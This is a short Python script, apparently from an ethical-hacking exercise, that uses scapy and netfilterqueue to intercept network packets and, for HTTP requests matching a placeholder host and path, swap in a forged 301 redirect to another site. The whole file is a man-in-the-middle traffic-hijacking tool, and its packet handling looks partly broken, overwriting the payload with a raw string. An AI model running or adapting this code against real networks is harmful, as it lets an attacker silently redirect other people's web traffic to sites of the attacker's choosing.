#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
from scapy.layers import http

def process(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(http.HTTPRequest) and scapy_packet.haslayer(scapy.TCP):        
        if scapy_packet[http.HTTPRequest].Path == '/any http path/' and scapy_packet[http.HTTPRequest].Host == 'any http host':
            scapy_packet[http.HTTPRequest].Host = 'www.fcbarcelona.com'
            scapy_packet[http.HTTPRequest].Path = '/en/'
            http_response = (
                "HTTP/1.1 301 Moved Permanently\r\n"
                "Location: https://www.fcbarcelona.com/en/\r\n"
                "Content-Length: 0\r\n\r\n"
            )
            #scapy_packet[scapy.Raw].load = http_response
            del scapy_packet[scapy.TCP].chksum
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            packet.set_payload(http_response)
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process)
queue.run()
